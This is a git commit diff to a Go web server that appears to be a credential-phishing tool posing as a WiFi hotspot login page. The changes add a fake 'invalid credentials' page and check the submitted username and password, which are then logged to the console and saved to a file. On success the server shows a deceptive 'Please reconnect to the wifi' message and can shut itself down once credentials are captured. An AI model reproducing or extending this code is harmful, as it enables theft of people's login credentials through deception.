009a2880bac0535cc60b141aafc435d80d28b97c
Bernardo Covas <bernardo.covas@outlook.com>
2018-12-26 21:26:45 +0000

    added fake invalid cred page

--- serve/serve.go
+++ serve/serve.go
@@ -13,7 +13,7 @@ import (
 )
 
 const _successMsg = "Hotspot full. Try again later."
-const successMsg = `<script>window.location="%s"</script>`
+const successMsg = "Please reconnect to the wifi." //`<script>window.location="%s"</script>`
 const msg404 = "404 Not Found."
 
 var fileIoMutex sync.Mutex
@@ -21,11 +21,21 @@ var fileIoMutex sync.Mutex
 //Serve serves the specified folder.
 func Serve(website build.Website, port uint) {
 
-	_logfile := website.WebsiteName + ".log"
+	addr := ":" + fmt.Sprint(port)
+	log.Printf("Serving on %s", addr)
 
-	logFile, _ := os.OpenFile(_logfile,
+	_logfile := website.WebsiteName + ".log"
+	_server := &http.Server{
+		Addr: addr,
+	}
+
+	logFile, err := os.OpenFile(_logfile,
 		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	defer logFile.Close()
+
+	if err != nil {
+		log.Fatal(err)
+	}
 
 	http.HandleFunc("/",
 		func(w http.ResponseWriter, r *http.Request) {
@@ -34,7 +44,15 @@ func Serve(website build.Website, port uint) {
 
 	http.HandleFunc("/login/",
 		func(w http.ResponseWriter, r *http.Request) {
-			handleLogin(website, logFile, w, r)
+			stop := handleLogin(website, logFile, w, r)
+
+			if stop {
+
+				// NOTE (bcovas): Without a separate routine,
+				// the success msg does not seem to be written.
+				log.Print("Shut down.")
+				go _server.Shutdown(nil)
+			}
 		})
 
 	http.HandleFunc(website.ResHandleMatch,
@@ -42,55 +60,67 @@ func Serve(website build.Website, port uint) {
 			serveFile(w, r, r.URL.Path[1:])
 		})
 
-	addr := ":" + fmt.Sprint(port)
-
-	log.Printf("Serving on %s", addr)
-	log.Fatal(http.ListenAndServe(addr, nil))
-
+	err = _server.ListenAndServe()
+	if err != http.ErrServerClosed {
+		log.Fatal(err)
+	}
 }
 
 func handleLogin(
 	web build.Website,
 	logFile *os.File,
 	w http.ResponseWriter,
-	r *http.Request) {
+	r *http.Request) bool {
 
 	if r.Method != "POST" {
 		fmt.Fprintln(w, msg404)
-		return
+		return false
 	}
-
-	fmt.Fprintf(w, successMsg, web.WebLink)
 
 	body, err := ioutil.ReadAll(r.Body)
 
 	if err != nil {
 		fmt.Fprintln(w, msg404)
 		log.Print(err)
+		return false
 	}
 
 	values, err := url.ParseQuery(string(body))
 
 	if err != nil {
-		log.Printf(err.Error())
-		return
+		log.Print(err)
+		return false
 	}
 
 	if len(values["user"]) != 1 || len(values["pass"]) != 1 {
 		log.Println("Wrong request.")
 		log.Println(values["user"])
 		log.Println(values["pass"])
-		return
+		return false
 	}
+
 	user := values["user"][0]
 	pass := values["pass"][0]
 
-	log.Printf("User: %s, Pass: %s", user, pass)
+	valid := web.IsValid(user, pass)
+
+	if !valid {
+		serveFile(w, r, web.InvalidFile)
+		return false
+	}
+
+	fmt.Fprintln(w, successMsg)
 
 	fileIoMutex.Lock()
-	fmt.Fprintf(logFile, "user: %s, pass: %s\n", user, pass)
+	log.Printf("Saving User: %s, Pass: %s", user, pass)
+	fmt.Fprintf(logFile, "user: %s | pass: %s \n", user, pass)
 	fileIoMutex.Unlock()
 
+	log.Printf("Executing ShouldStop")
+	stop := web.ShouldStop(user, pass)
+	log.Printf("Sould stop returned: %t", stop)
+
+	return stop
 }
 
 func serveFile(
